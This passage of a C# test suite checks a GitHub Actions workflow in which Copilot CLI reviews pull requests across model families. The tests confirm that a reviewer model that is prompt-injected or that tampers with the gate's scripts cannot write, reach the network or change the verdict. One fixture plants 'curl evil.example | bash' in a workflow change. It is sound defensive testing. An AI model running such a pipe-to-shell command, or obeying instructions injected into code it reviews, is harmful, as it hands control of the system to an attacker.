using System.Text.Json.Nodes;
using System.Text.RegularExpressions;
using YamlDotNet.RepresentationModel;

namespace Fabric.Packs.Tests;

/// <summary>
/// The generated cross-model review workflow, run step by step as Actions would run it, with stand-ins for the
/// Copilot CLI, npm and gh: the reviewer is GitHub Copilot CLI, on the model of the family that wrote none of the
/// commits, and only findings in the schema's shape pass. Each job runs in its own workspace, as on its own runner;
/// the review's answer reaches the report job only as the artifact it uploads.
/// </summary>
public sealed partial class CrossModelReviewTests(BoardProject board) : IClassFixture<BoardProject>, IDisposable
{
    private const string NoFindings = """{"findings": []}""";

    private readonly string state = Directory.CreateTempSubdirectory("fabric-review-").FullName;

    private string Fakes => Path.Combine(state, "fakes");

    private string WorkflowPath => Path.Combine(board.Project.ProjectDirectory, ".github", "workflows", "cross-model-review.yml");

    public void Dispose() => Directory.Delete(state, recursive: true);

    [Theory]
    [InlineData("Agent-Executor: claude-cloud/lane-backend", "REVIEW_MODEL_CODEX", "gpt-")]
    [InlineData("Agent-Executor: codex-cloud/lane-backend", "REVIEW_MODEL_CLAUDE", "claude-")]
    public void Copilot_reviews_with_the_model_of_the_family_that_wrote_none_of_the_commits(string trailer, string setting, string family)
    {
        var expectedModel = WorkflowEnvironment()[setting];
        expectedModel.ShouldStartWith(family, Case.Sensitive, $"{setting} names a model of another family.");

        var run = Review($"Change\n\n{trailer}", NoFindings);

        run.ExitCode.ShouldBe(0, run.Log);
        var arguments = run.CopilotArguments.ShouldNotBeNull(run.Log);
        arguments.ShouldContain("-p");
        arguments.IndexOf("--model").ShouldBeGreaterThanOrEqualTo(0, string.Join(' ', arguments));
        arguments[arguments.IndexOf("--model") + 1].ShouldBe(expectedModel);
        ((string)Reviews().ShouldHaveSingleItem()!["body"]!).ShouldContain(expectedModel);
    }

    [Fact]
    public void Copilot_signs_in_with_the_workflow_token_and_without_gh_token()
    {
        var run = Review("Change\n\nAgent-Executor: claude-cloud/lane-backend", NoFindings);

        run.ExitCode.ShouldBe(0, run.Log);
        File.ReadAllText(Path.Combine(Fakes, "copilot-env")).ShouldBe("COPILOT_GITHUB_TOKEN=workflow-token\nGH_TOKEN=unset\nGITHUB_TOKEN=unset\n");
    }

    /// <summary>
    /// The review is billed to the organisation through the workflow's own token: no secret, no personal token, no model
    /// vendor's key. The reviewer's job can call Copilot and read the repository, nothing more; only the report job,
    /// which never runs the reviewer, can write to the pull request.
    /// </summary>
    [Fact]
    public void The_reviewer_s_job_cannot_write_to_the_pull_request_and_no_secret_is_used()
    {
        var workflow = File.ReadAllText(WorkflowPath);
        var root = Root();
        var jobs = (YamlMappingNode)root["jobs"];

        jobs.Children.Keys.Select(key => ((YamlScalarNode)key).Value).ShouldBe(["choose", "review", "report"]);
        SecretReference().Matches(workflow).ShouldBeEmpty();
        workflow.ShouldNotContain("ANTHROPIC_API_KEY");
        workflow.ShouldNotContain("OPENAI_API_KEY");
        Mapping((YamlMappingNode)jobs["review"], "permissions").ShouldBe(new Dictionary<string, string>
        {
            ["contents"] = "read",
            ["copilot-requests"] = "write",
        });
        Mapping((YamlMappingNode)jobs["report"], "permissions").ShouldBe(new Dictionary<string, string>
        {
            ["contents"] = "read",
            ["pull-requests"] = "write",
            ["statuses"] = "write",
        });
        Mapping(root, "permissions").Values.ShouldNotContain("write");
        Mapping((YamlMappingNode)jobs["choose"], "permissions").Values.ShouldNotContain("write");
    }

    [Fact]
    public void The_report_job_takes_the_gate_from_the_base_sha_and_never_runs_the_reviewer()
    {
        var jobs = (YamlMappingNode)Root()["jobs"];
        var report = ((YamlSequenceNode)((YamlMappingNode)jobs["report"])["steps"]).Cast<YamlMappingNode>().ToList();
        var review = ((YamlSequenceNode)((YamlMappingNode)jobs["review"])["steps"]).Cast<YamlMappingNode>().ToList();

        report.ShouldContain(step => Uses(step).StartsWith("actions/checkout@", StringComparison.Ordinal)
            && Mapping(step, "with").GetValueOrDefault("ref") == "${{ github.event.pull_request.base.sha }}"
            && Mapping(step, "with").GetValueOrDefault("path") == ".gate");
        report.ShouldNotContain(step => Script(step).Contains("copilot", StringComparison.Ordinal));
        review.ShouldNotContain(step => Script(step).Contains("report-review.sh", StringComparison.Ordinal));
    }

    /// <summary>
    /// The reviewer reads an untrusted diff, and the scripts that decide its verdict could be in its workspace: what it
    /// writes there must not change the verdict. Only its answer reaches the report job.
    /// </summary>
    [Fact]
    public void A_reviewer_that_rewrites_the_gate_s_scripts_does_not_change_the_verdict()
    {
        var blocking = """{"findings": [{"severity": "blocking", "file": "src/Invoice.cs", "line": 12, "message": "Paying twice charges twice."}]}""";

        var run = Review("Change\n\nAgent-Executor: claude-cloud/lane-backend", blocking, tamper: true);

        File.ReadAllText(Path.Combine(state, "workspace-review", ".gate", ".github", "scripts", "board", "report-review.sh")).ShouldContain("tampered");
        run.ExitCode.ShouldNotBe(0, run.Log);
        run.FailedJob.ShouldBe("report", run.Log);
        ((string)Reviews().ShouldHaveSingleItem()!["body"]!).ShouldContain("1 blocking");
    }

    [Fact]
    public void The_report_job_posts_the_findings_the_review_job_answered_after_its_prose()
    {
        var answer = "I read the diff.\n\n" + """{"findings": [{"severity": "optional", "file": "src/Invoice.cs", "line": 3, "message": "Shorter name?"}]}""";

        var run = Review("Change\n\nAgent-Executor: claude-cloud/lane-backend", answer);

        run.ExitCode.ShouldBe(0, run.Log);
        ((string)Reviews().ShouldHaveSingleItem()!["body"]!).ShouldContain("0 blocking, 1 optional");
    }

    [Fact]
    public void A_reviewer_that_crashes_fails_the_review_job_and_nothing_is_posted()
    {
        var run = Review("Change\n\nAgent-Executor: claude-cloud/lane-backend", NoFindings, copilotExitCode: 1);

        run.ExitCode.ShouldNotBe(0, run.Log);
        run.FailedJob.ShouldBe("review", run.Log);
        Reviews().ShouldBeEmpty();
    }

    /// <summary>
    /// The owner's decision on #474: Copilot's usage limit is not a finding. The review is postponed instead of failed,
    /// so no job is red and nothing is posted on the pull request, but the verdict status stays pending: a postponed
    /// review is never a pass.
    /// </summary>
    [Fact]
    public void A_reviewer_that_hits_copilot_s_usage_limit_is_postponed_not_failed_and_never_passes()
    {
        var run = Review("Change\n\nAgent-Executor: claude-cloud/lane-backend", NoFindings, limitedModels: ["*"]);

        run.ExitCode.ShouldBe(0, run.Log);
        run.Log.ShouldContain("trust tier usage limit reached");
        Reviews().ShouldBeEmpty();
        var status = Statuses().ShouldHaveSingleItem(run.Log)!;
        ((string)status["context"]!).ShouldBe(VerdictContext);
        ((string)status["sha"]!).ShouldBe("HEAD");
        ((string)status["state"]!).ShouldBe("pending");
        ((string)status["description"]!).ShouldStartWith("Postponed");
        ((string)status["target_url"]!).ShouldBe($"https://github.com/acme/shop/actions/runs/{RunId}");
    }

    [Theory]
    [InlineData(NoFindings, "success")]
    [InlineData("""{"findings": [{"severity": "optional", "file": "src/Invoice.cs", "line": 3, "message": "Shorter name?"}]}""", "success")]
    [InlineData(Blocking, "failure")]
    public void A_review_that_reaches_a_verdict_sets_the_verdict_status_to_it(string answer, string expectedState)
    {
        var run = Review("Change\n\nAgent-Executor: claude-cloud/lane-backend", answer);

        var status = Statuses().ShouldHaveSingleItem(run.Log)!;
        ((string)status["context"]!).ShouldBe(VerdictContext);
        ((string)status["sha"]!).ShouldBe("HEAD");
        ((string)status["state"]!).ShouldBe(expectedState);
    }

    [Fact]
    public void A_reviewer_that_crashes_without_reaching_a_limit_is_not_postponed()
    {
        var run = Review("Change\n\nAgent-Executor: claude-cloud/lane-backend", "Error: something else broke", copilotExitCode: 1);

        run.FailedJob.ShouldBe("review", run.Log);
        Statuses().ShouldNotContain(status => (string)status!["state"]! == "pending" || (string)status!["state"]! == "success");
    }

    /// <summary>
    /// Main moved after the pull request opened (a Codex agent's change landed) and the Claude agent merged it, while
    /// the event still carries the old base SHA. Main's commits are not the branch's: Codex still reviews.
    /// </summary>
    [Fact]
    public void The_reviewer_is_chosen_from_the_branch_s_commits_against_the_base_branch_tip_not_a_stale_base_sha()
    {
        var run = Review("Change\n\nAgent-Executor: claude-cloud/lane-backend", NoFindings, mainMoved: MainMovedByCodex);

        run.ExitCode.ShouldBe(0, run.Log);
        var arguments = run.CopilotArguments.ShouldNotBeNull(run.Log);
        arguments[arguments.IndexOf("--model") + 1].ShouldBe(WorkflowEnvironment()["REVIEW_MODEL_CODEX"]);
    }

    /// <summary>The same pull request: the diff the reviewer is asked to read is the branch's change, not main's too.</summary>
    [Fact]
    public void The_reviewed_diff_is_against_the_base_branch_tip_not_a_stale_base_sha()
    {
        var change = new Dictionary<string, (string, string)> { ["src/Invoice.cs"] = ("", "class Invoice;\n") };

        var run = Review("Change\n\nAgent-Executor: claude-cloud/lane-backend", NoFindings, change: change, mainMoved: ("Merged on main\n\nAgent-Executor: claude-cloud/other", "Merge main\n\nAgent-Executor: claude-cloud/lane-backend"));

        run.ExitCode.ShouldBe(0, run.Log);
        var prompt = Values(run.CopilotArguments.ShouldNotBeNull(run.Log), "-p").ShouldHaveSingleItem();
        var range = DiffRange().Match(prompt);
        range.Success.ShouldBeTrue(prompt);
        BoardProject.Git(Path.Combine(state, "workspace-review"), "diff", "--name-only", range.Groups[1].Value).ShouldBe("src/Invoice.cs");
    }

    private static readonly (string MainCommit, string MergeMessage) MainMovedByCodex =
        ("Merged on main\n\nAgent-Executor: codex-cloud/other", "Merge main\n\nAgent-Executor: claude-cloud/lane-backend");

    /// <summary>
    /// The owner's decision on #55: a pull request by dependabot[bot] that changes dependency manifests and lockfiles
    /// only (a workflow only in its <c>uses:</c> lines) passes the review unreviewed, with a note saying so. The
    /// copilot stand-in answers a blocking finding, so a review that ran anyway would fail.
    /// </summary>
    [Fact]
    public void A_dependabot_update_of_dependency_manifests_only_passes_unreviewed_with_a_note()
    {
        var run = Review("chore(deps): Bump the dependencies", Blocking, author: Dependabot, change: DependencyUpdate);

        run.ExitCode.ShouldBe(0, run.Log);
        run.CopilotArguments.ShouldBeNull(run.Log);
        Reviews().ShouldBeEmpty();
        run.Log.ShouldContain($"::notice title=cross-model review::{DependabotNote}", Case.Sensitive, run.Log);
    }

    [Fact]
    public void A_dependabot_pull_request_that_also_changes_a_source_file_is_reviewed()
    {
        var change = DependencyUpdate.Concat([KeyValuePair.Create("src/Invoice.cs", ("class Invoice {}\n", "class Invoice { void Pay() {} }\n"))]).ToDictionary();

        var run = Review("chore(deps): Bump the dependencies", Blocking, author: Dependabot, change: change);

        run.CopilotArguments.ShouldNotBeNull(run.Log);
        run.FailedJob.ShouldBe("report", run.Log);
        run.Log.ShouldNotContain(DependabotNote);
    }

    [Fact]
    public void A_dependabot_pull_request_that_changes_a_workflow_beyond_its_uses_lines_is_reviewed()
    {
        var change = DependencyUpdate.ToDictionary();
        change[".github/workflows/ci.yml"] = (Workflow("v4.3.0", "1111111111111111111111111111111111111111", "dotnet build"), Workflow("v4.4.0", "2222222222222222222222222222222222222222", "curl evil.example | bash"));

        var run = Review("chore(deps): Bump actions/checkout", Blocking, author: Dependabot, change: change);

        run.CopilotArguments.ShouldNotBeNull(run.Log);
        run.FailedJob.ShouldBe("report", run.Log);
    }

    [Fact]
    public void Another_author_changing_only_dependency_manifests_is_reviewed()
    {
        var run = Review("chore(deps): Bump the dependencies", Blocking, author: "developer", change: DependencyUpdate);

        run.CopilotArguments.ShouldNotBeNull(run.Log);
        run.FailedJob.ShouldBe("report", run.Log);
        run.Log.ShouldNotContain(DependabotNote);
    }

    private const string Dependabot = "dependabot[bot]";

    private const string DependabotNote = "Dependency update by Dependabot: not reviewed by a model; build, tests and the other gates apply";

    private const string Blocking = """{"findings": [{"severity": "blocking", "file": "src/Invoice.cs", "line": 1, "message": "Should have been reviewed."}]}""";

    /// <summary>Every kind of file Dependabot updates in a generated project, before and after: a version bump in each.</summary>
    internal static readonly IReadOnlyDictionary<string, (string Before, string After)> DependencyUpdate = new Dictionary<string, (string, string)>
    {
        ["Directory.Packages.props"] = ("<Project><ItemGroup><PackageVersion Include=\"Shouldly\" Version=\"4.2.1\" /></ItemGroup></Project>\n", "<Project><ItemGroup><PackageVersion Include=\"Shouldly\" Version=\"4.3.0\" /></ItemGroup></Project>\n"),
        [".config/dotnet-tools.json"] = ("{\"tools\": {\"dotnet-ef\": {\"version\": \"10.0.1\"}}}\n", "{\"tools\": {\"dotnet-ef\": {\"version\": \"10.0.2\"}}}\n"),
        ["web/package.json"] = ("{\"devDependencies\": {\"vite\": \"7.1.0\"}}\n", "{\"devDependencies\": {\"vite\": \"7.2.0\"}}\n"),
        ["web/app/package.json"] = ("{\"dependencies\": {\"react\": \"19.1.0\"}}\n", "{\"dependencies\": {\"react\": \"19.2.0\"}}\n"),
        ["web/pnpm-lock.yaml"] = ("lockfileVersion: '9.0'\n# vite 7.1.0\n", "lockfileVersion: '9.0'\n# vite 7.2.0\n"),
        [".github/workflows/ci.yml"] = (Workflow("v4.3.0", "1111111111111111111111111111111111111111", "dotnet build"), Workflow("v4.4.0", "2222222222222222222222222222222222222222", "dotnet build")),
    };

    internal static string Workflow(string version, string sha, string command) => $"""
        name: ci
        on: pull_request
        jobs:
          build:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@{sha} # {version}
              - run: {command}

        """;

    private static string Uses(YamlMappingNode step) =>
        step.Children.TryGetValue(new YamlScalarNode("uses"), out var uses) ? ((YamlScalarNode)uses).Value! : "";

    private static string Script(YamlMappingNode step) =>
        step.Children.TryGetValue(new YamlScalarNode("run"), out var run) ? ((YamlScalarNode)run).Value! : "";

    [Fact]
    public void The_copilot_cli_is_installed_at_an_exact_version()
    {
        var run = Review("Change\n\nAgent-Executor: claude-cloud/lane-backend", NoFindings);

        run.ExitCode.ShouldBe(0, run.Log);
        var install = File.ReadAllLines(Path.Combine(Fakes, "npm-args"));
        install[..2].ShouldBe(["install", "-g"]);
        ExactCopilotVersion().IsMatch(install[2]).ShouldBeTrue($"{install[2]} is not one exact version.");
    }

    [Fact]
    public void The_reviewer_takes_its_rules_from_the_base_branch_and_no_instructions_from_the_pull_request()
    {
        var run = Review("Change\n\nAgent-Executor: claude-cloud/lane-backend", NoFindings);

        run.ExitCode.ShouldBe(0, run.Log);
        var arguments = run.CopilotArguments.ShouldNotBeNull(run.Log);
        arguments.ShouldContain("--no-custom-instructions");
        arguments.ShouldNotContain("--trust-folder");
        var prompt = arguments[arguments.IndexOf("-p") + 1];
        prompt.ShouldContain(".gate/AGENTS.md");
        prompt.ShouldContain(".gate/.claude/agents/");
        prompt.ShouldContain("\"findings\"");
    }

    /// <summary>
    /// The diff under review is untrusted: a prompt injected into it must not get the reviewer to run anything that
    /// writes, reaches the network, or reads the token. Copilot asks no one in prompt mode, so what is not allowed is
    /// refused (copilot help permissions).
    /// </summary>
    [Fact]
    public void The_reviewer_may_run_only_read_only_commands_and_its_shell_never_sees_the_token()
    {
        string[] readOnly = ["shell(git diff)", "shell(git show)", "shell(git log)", "shell(ls)", "shell(grep)"];
        var run = Review("Change\n\nAgent-Executor: claude-cloud/lane-backend", NoFindings);

        run.ExitCode.ShouldBe(0, run.Log);
        var arguments = run.CopilotArguments.ShouldNotBeNull(run.Log);
        foreach (var broad in new[] { "--allow-all-tools", "--allow-all", "--yolo", "--allow-all-paths", "--allow-all-urls", "--allow-url" })
        {
            arguments.ShouldNotContain(argument => argument == broad || argument.StartsWith(broad + "=", StringComparison.Ordinal), string.Join(' ', arguments));
        }

        var allowed = Values(arguments, "--allow-tool");
        allowed.ShouldContain("shell(git diff)");
        allowed.ShouldBeSubsetOf(readOnly);
        Values(arguments, "--secret-env-vars").SelectMany(value => value.Split(',')).ShouldContain("COPILOT_GITHUB_TOKEN");
    }

    /// <summary>Copilot reads COPILOT_* variables as its own settings (copilot help environment); the workflow sets only its token.</summary>
    [Fact]
    public void The_workflow_sets_no_copilot_variable_but_the_token()
    {
        var root = Root();
        var jobs = (YamlMappingNode)root["jobs"];
        var names = Mapping(root, "env").Keys
            .Concat(jobs.Children.Values.Cast<YamlMappingNode>().SelectMany(job => Mapping(job, "env").Keys))
            .Concat(jobs.Children.Values.Cast<YamlMappingNode>()
                .SelectMany(job => ((YamlSequenceNode)job["steps"]).Cast<YamlMappingNode>())
                .SelectMany(step => Mapping(step, "env").Keys));

        names.Where(name => name.StartsWith("COPILOT_", StringComparison.Ordinal)).Distinct().ShouldBe(["COPILOT_GITHUB_TOKEN"]);
    }

    /// <summary>A flag's values, given as <c>--flag value</c> or <c>--flag=value</c>.</summary>
    private static List<string> Values(List<string> arguments, string flag) =>
    [
        .. arguments.Select((argument, index) => argument == flag && index + 1 < arguments.Count
            ? arguments[index + 1]
            : argument.StartsWith(flag + "=", StringComparison.Ordinal) ? argument[(flag.Length + 1)..] : null)
            .OfType<string>(),
    ];

    [Theory]
    [InlineData("I reviewed the change; it looks fine.", 0)]
    [InlineData("""{"findings": [{"severity": "blocking", "file": "src/Invoice.cs", "line": 12, "message": "Paying twice charges twice."}]}""", 0)]
    [InlineData(NoFindings, 1)]
    public void A_review_fails_unless_copilot_answers_in_the_findings_shape_with_nothing_blocking(string answer, int copilotExitCode)
    {
        var run = Review("Change\n\nAgent-Executor: claude-cloud/lane-backend", answer, copilotExitCode);

        run.ExitCode.ShouldNotBe(0, run.Log);
        run.CopilotArguments.ShouldNotBeNull(run.Log);
    }

    private YamlMappingNode Root() => Root(WorkflowPath);

    private static YamlMappingNode Root(string workflowPath)
    {
        var yaml = new YamlStream();
        using var reader = new StreamReader(workflowPath);
        yaml.Load(reader);
        return (YamlMappingNode)yaml.Documents[0].RootNode;
    }

    private Dictionary<string, string> WorkflowEnvironment() => Mapping(Root(), "env");

    private static Dictionary<string, string> Mapping(YamlMappingNode node, string key) =>
        node.Children.TryGetValue(new YamlScalarNode(key), out var value)
            ? ((YamlMappingNode)value).Children.ToDictionary(entry => ((YamlScalarNode)entry.Key).Value!, entry => ((YamlScalarNode)entry.Value).Value ?? "")
            : [];

    private JsonArray Reviews()
    {
        var path = Path.Combine(state, "reviews.json");
        return File.Exists(path) ? JsonNode.Parse(File.ReadAllText(path))!.AsArray() : [];
    }

    /// <summary>The commit statuses posted, oldest first.</summary>
    private JsonArray Statuses()
    {
        var path = Path.Combine(state, "statuses.json");
        return File.Exists(path) ? JsonNode.Parse(File.ReadAllText(path))!.AsArray() : [];
    }

    /// <summary>The model of each copilot call in the last run, in order.</summary>
    private List<string> CopilotModels()
    {
        var path = Path.Combine(Fakes, "copilot-models");
        return File.Exists(path) ? [.. File.ReadAllLines(path)] : [];
    }

    private const string RunId = "42";

    private const string VerdictContext = "cross-model-review/verdict";

    private sealed record ReviewRun(int ExitCode, string Log, List<string>? CopilotArguments, string? FailedJob = null);

    /// <summary>
    /// A pull request of one commit, reviewed: the choose job, then the review job, with the copilot stand-in answering
    /// <paramref name="answer"/> and exiting with <paramref name="copilotExitCode"/>, then the report job; a job that
    /// fails stops the run, as its dependants are skipped. Each job has its own workspace holding the pull request's
    /// commits and the gate's files (the generated project's, as the base branch's checkout in .gate). With
    /// <paramref name="tamper"/> the reviewer overwrites every report-review.sh in its workspace. The pull request is
    /// opened by <paramref name="author"/>, and its commit changes each file of <paramref name="change"/> from its
    /// content on the base branch to the new one (none: an empty commit).
    /// </summary>
    private ReviewRun Review(
        string commitMessage,
        string answer,
        int copilotExitCode = 0,
        bool tamper = false,
        string author = "developer",
        IReadOnlyDictionary<string, (string Before, string After)>? change = null,
        (string MainCommit, string MergeMessage)? mainMoved = null,
        string[]? limitedModels = null)
    {
        WriteFakes(answer, copilotExitCode, tamper, limitedModels ?? []);

        Dictionary<string, string> expressions = new()
        {
            ["github.base_ref"] = "main",
            ["github.repository"] = "acme/shop",
            ["github.run_id"] = RunId,
            ["github.server_url"] = "https://github.com",
            ["github.event.pull_request.base.sha"] = "base",
            ["github.event.pull_request.head.sha"] = "HEAD",
            ["github.event.pull_request.number"] = "5",
            ["github.event.pull_request.user.login"] = author,
            ["github.token"] = "workflow-token",
        };
        var log = "";
        foreach (var name in new[] { "choose", "review", "report" })
        {
            var job = RunJob(WorkflowPath, name, Workspace(name, commitMessage, change ?? new Dictionary<string, (string, string)>(), mainMoved), expressions);
            log += job.Log;
            if (job.ExitCode != 0)
            {
                return new ReviewRun(job.ExitCode, log, CopilotArguments(), name);
            }

            foreach (var (output, value) in job.Outputs)
            {
                expressions[$"needs.{name}.outputs.{output}"] = value;
            }
        }

        return new ReviewRun(0, log, CopilotArguments());
    }

    private List<string>? CopilotArguments()
    {
        var arguments = Path.Combine(Fakes, "copilot-args");
        return File.Exists(arguments) ? [.. File.ReadAllText(arguments).Split('\0')[..^1]] : null;
    }

    /// <summary>
    /// A job's own checkout: the pull request's commits, the base branch as origin/main (the checkout fetches every
    /// branch), and the gate's files from the base branch in .gate. With <paramref name="mainMoved"/>, main gained a
    /// commit (adding main.txt) after the pull request opened, which the pull request then merged; the event's base SHA
    /// stays at <c>base</c>.
    /// </summary>
    private string Workspace(
        string job,
        string commitMessage,
        IReadOnlyDictionary<string, (string Before, string After)> change,
        (string MainCommit, string MergeMessage)? mainMoved = null)
    {
        var workspace = Path.Combine(state, $"workspace-{job}");
        if (Directory.Exists(workspace))
        {
            Directory.Delete(workspace, recursive: true);
        }

        Directory.CreateDirectory(workspace);
        BoardProject.Git(workspace, "init", "--quiet", "--initial-branch=main");
        foreach (var (file, (before, _)) in change)
        {
            Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(workspace, file))!);
            File.WriteAllText(Path.Combine(workspace, file), before);
        }

        BoardProject.Git(workspace, "add", "--all");
        BoardProject.Git(workspace, "commit", "--quiet", "--allow-empty", "-m", "base");
        BoardProject.Git(workspace, "tag", "base");
        foreach (var (file, (_, after)) in change)
        {
            File.WriteAllText(Path.Combine(workspace, file), after);
        }

        BoardProject.Git(workspace, "add", "--all");
        BoardProject.Git(workspace, "commit", "--quiet", "--allow-empty", "-m", commitMessage);
        BoardProject.Git(workspace, "update-ref", "refs/remotes/origin/main", "base");
        if (mainMoved is var (mainCommit, mergeMessage))
        {
            BoardProject.Git(workspace, "checkout", "--quiet", "-b", "moved", "base");
            File.WriteAllText(Path.Combine(workspace, "main.txt"), "main\n");
            BoardProject.Git(workspace, "add", "main.txt");
            BoardProject.Git(workspace, "commit", "--quiet", "-m", mainCommit);
            BoardProject.Git(workspace, "update-ref", "refs/remotes/origin/main", "moved");
            BoardProject.Git(workspace, "checkout", "--quiet", "main");
            BoardProject.Git(workspace, "merge", "--quiet", "--no-ff", "-m", mergeMessage, "moved");
        }

        foreach (var entry in new[] { ".github", ".claude", "AGENTS.md" })
        {
            Copy(Path.Combine(board.Project.ProjectDirectory, entry), Path.Combine(workspace, ".gate", entry));
        }

        return workspace;
    }

    private static void Copy(string source, string target)
    {
        if (File.Exists(source))
        {
            Directory.CreateDirectory(Path.GetDirectoryName(target)!);
            File.Copy(source, target, overwrite: true);
            return;
        }

        foreach (var file in Directory.EnumerateFiles(source, "*", SearchOption.AllDirectories))
        {
            Copy(file, Path.Combine(target, Path.GetRelativePath(source, file)));
        }
    }

    /// <summary>
    /// The stand-ins for one run. The copilot stand-in records its arguments and each model it was asked for, and for
    /// a model in <paramref name="limitedModels"/> (<c>*</c>: every model) answers as Copilot did on 2026-11-09 when the
    /// usage limit was reached: the message on stderr, exit code 1.
    /// </summary>
    private void WriteFakes(string answer, int copilotExitCode, bool tamper, string[] limitedModels)
    {
        Directory.CreateDirectory(Fakes);
        File.Delete(Path.Combine(Fakes, "copilot-args"));
        File.Delete(Path.Combine(Fakes, "copilot-models"));
        File.WriteAllText(Path.Combine(Fakes, "answer"), answer);
        File.WriteAllText(Path.Combine(Fakes, "limited"), string.Concat(limitedModels.Select(model => model + "\n")));
        var tampering = tamper
            ? """
                for script in .gate/.github/scripts/board/report-review.sh .github/scripts/board/report-review.sh; do
                  mkdir -p "$(dirname "$script")"
                  printf '#!/usr/bin/env bash\n# tampered\nexit 0\n' > "$script"
                done
                """
            : "";
        Fake("copilot", $$"""
            #!/usr/bin/env bash
            printf '%s\0' "$@" > "$FAKES/copilot-args"
            arguments=("$@")
            model=""
            for at in "${!arguments[@]}"; do
              if [ "${arguments[$at]}" = --model ]; then model="${arguments[$((at + 1))]}"; fi
            done
            echo "$model" >> "$FAKES/copilot-models"
            printf 'COPILOT_GITHUB_TOKEN=%s\nGH_TOKEN=%s\nGITHUB_TOKEN=%s\n' "${COPILOT_GITHUB_TOKEN-unset}" "${GH_TOKEN-unset}" "${GITHUB_TOKEN-unset}" > "$FAKES/copilot-env"
            {{tampering}}
            if grep -qxF -e "$model" -e '*' "$FAKES/limited"; then
              echo "trust tier usage limit reached (Request ID: D809:565E2:2BBB814:2EF8725:6AF189ED)" >&2
              exit 1
            fi
            cat "$FAKES/answer"
            exit {{copilotExitCode}}
            """);
        Fake("npm", """
            #!/usr/bin/env bash
            printf '%s\n' "$@" > "$FAKES/npm-args"
            """);
    }

    private void Fake(string name, string script)
    {
        var path = Path.Combine(Fakes, name);
        File.WriteAllText(path, script.Replace("\r\n", "\n", StringComparison.Ordinal) + "\n");
        if (!OperatingSystem.IsWindows())
        {
            File.SetUnixFileMode(path, UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.UserExecute);
        }
    }

    private sealed record JobRun(int ExitCode, string Log, Dictionary<string, string> Outputs);

    /// <summary>
    /// Runs a job's <c>run</c> steps in order as Actions does (bash -eo pipefail, GITHUB_ENV and GITHUB_OUTPUT carried
    /// over). Of its <c>uses</c> steps, artifact uploads and downloads move files through the run's artifact store; the
    /// rest are checkouts, which the workspace stands in for. An expression the test does not know, a secret say, fails
    /// the test.
    /// </summary>
    private JobRun RunJob(string workflowPath, string name, string workspace, Dictionary<string, string> expressions)
    {
        var job = (YamlMappingNode)((YamlMappingNode)Root(workflowPath)["jobs"])[name];
        var gh = Path.Combine(AppContext.BaseDirectory, "Board");
        if (!OperatingSystem.IsWindows())
        {
            File.SetUnixFileMode(Path.Combine(gh, "gh"), UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.UserExecute);
        }

        var runnerTemp = Directory.CreateDirectory(Path.Combine(state, $"runner-{name}")).FullName;
        Dictionary<string, string> environment = new(BoardProject.GitIdentity)
        {
            ["PATH"] = Fakes + ":" + gh + ":" + Environment.GetEnvironmentVariable("PATH"),
            ["FAKES"] = Fakes,
            ["GH_FAKE_STATE"] = state,
            ["GITHUB_REPOSITORY"] = "acme/shop",
            ["RUNNER_TEMP"] = runnerTemp,
            ["GITHUB_ENV"] = Path.Combine(runnerTemp, "env"),
        };
        foreach (var (key, value) in Mapping(Root(workflowPath), "env").Concat(Mapping(job, "env")))
        {
            environment[key] = Evaluate(value, expressions, environment, []);
        }

        Dictionary<string, Dictionary<string, string>> steps = [];
        var log = "";
        foreach (var step in ((YamlSequenceNode)job["steps"]).Cast<YamlMappingNode>())
        {
            if (!step.Children.TryGetValue(new YamlScalarNode("run"), out var run))
            {
                TransferArtifact(step, expressions, environment, steps);
                continue;
            }

            Dictionary<string, string> stepEnvironment = new(environment) { ["GITHUB_OUTPUT"] = Path.Combine(runnerTemp, "output") };
            foreach (var (key, value) in Mapping(step, "env"))
            {
                stepEnvironment[key] = Evaluate(value, expressions, environment, steps);
            }

            File.WriteAllText(stepEnvironment["GITHUB_ENV"], "");
            File.WriteAllText(stepEnvironment["GITHUB_OUTPUT"], "");
            var script = Evaluate(((YamlScalarNode)run).Value!, expressions, environment, steps);
            var (exitCode, output) = Shell.Run(workspace, stepEnvironment, "bash", "--noprofile", "--norc", "-eo", "pipefail", "-c", script);
            log += $"[{name}] {script}\n{output}\n";
            if (exitCode != 0)
            {
                return new JobRun(exitCode, log, []);
            }

            foreach (var (key, value) in Lines(stepEnvironment["GITHUB_ENV"]))
            {
                environment[key] = value;
            }

            if (step.Children.TryGetValue(new YamlScalarNode("id"), out var id))
            {
                steps[((YamlScalarNode)id).Value!] = Lines(stepEnvironment["GITHUB_OUTPUT"]);
            }
        }

        var outputs = Mapping(job, "outputs").ToDictionary(entry => entry.Key, entry => Evaluate(entry.Value, expressions, environment, steps));
        return new JobRun(0, log, outputs);
    }

    /// <summary>The run's artifact store: an upload copies its file under the artifact's name, a download copies it back.</summary>
    private void TransferArtifact(
        YamlMappingNode step,
        Dictionary<string, string> expressions,
        Dictionary<string, string> environment,
        Dictionary<string, Dictionary<string, string>> steps)
    {
        var uses = Uses(step);
        var with = Mapping(step, "with").ToDictionary(entry => entry.Key, entry => Evaluate(entry.Value, expressions, environment, steps));
        if (uses.StartsWith("actions/upload-artifact@", StringComparison.Ordinal))
        {
            File.Exists(with["path"]).ShouldBeTrue($"The artifact {with["name"]} has no file at {with["path"]}.");
            var store = Directory.CreateDirectory(Path.Combine(state, "artifacts", with["name"])).FullName;
            File.Copy(with["path"], Path.Combine(store, Path.GetFileName(with["path"])), overwrite: true);
        }
        else if (uses.StartsWith("actions/download-artifact@", StringComparison.Ordinal))
        {
            Copy(Path.Combine(state, "artifacts", with["name"]), with["path"]);
        }
    }

    private static Dictionary<string, string> Lines(string path) =>
        File.ReadAllLines(path).Where(line => line.Contains('=', StringComparison.Ordinal))
            .Select(line => line.Split('=', 2))
            .ToDictionary(pair => pair[0], pair => pair[1]);

    private static string Evaluate(
        string text,
        Dictionary<string, string> expressions,
        Dictionary<string, string> environment,
        Dictionary<string, Dictionary<string, string>> steps) =>
        Expression().Replace(text, match =>
        {
            var expression = match.Groups[1].Value;
            var parts = expression.Split('.');
            if (parts is ["env", var variable])
            {
                return environment.GetValueOrDefault(variable, "");
            }

            if (parts is ["runner", "temp"])
            {
                return environment["RUNNER_TEMP"];
            }

            if (parts is ["steps", var step, "outputs", var output])
            {
                return steps.GetValueOrDefault(step)?.GetValueOrDefault(output) ?? "";
            }

